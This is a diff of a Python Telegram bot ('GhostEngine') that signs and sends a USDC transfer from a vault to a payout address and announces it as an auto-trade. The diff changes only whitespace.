@@ -59,10 +59,10 @@ class GhostEngine:
         yield_rate = Decimal('0.94') if "VIV" in target_asset else Decimal('0.90')
         stake_usdc = Decimal(self.stake_cad) / Decimal('1.36')
         val_stake = int(stake_usdc * 10**6)
-        
+       
         try:
             nonce = w3.eth.get_transaction_count(vault.address)
-            gas_price = int(w3.eth.gas_price * 1.4) 
+            gas_price = int(w3.eth.gas_price * 1.4)
 
             # Simulation Check
             usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).call({'from': vault.address})
@@ -76,12 +76,12 @@ class GhostEngine:
                 'gasPrice': gas_price,
                 'nonce': nonce,
             })
-            
+           
             signed_tx = w3.eth.account.sign_transaction(tx_data, vault.key)
             w3.eth.send_raw_transaction(signed_tx.raw_transaction)
-            
+           
             await context.bot.send_message(
-                chat_id, 
+                chat_id,
                 f"🕴️ **GHOST AUTO-TRADE EXECUTED**\n"
                 f"━━━━━━━━━━━━━━\n"
                 f"💎 **Market:** {target_asset}\n"
@@ -183,4 +183,6 @@ if __name__ == "__main__":
         app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
         print("🤖 Ghost Terminal Online...")
         app.run_polling(drop_pending_updates=True)
+
+
 
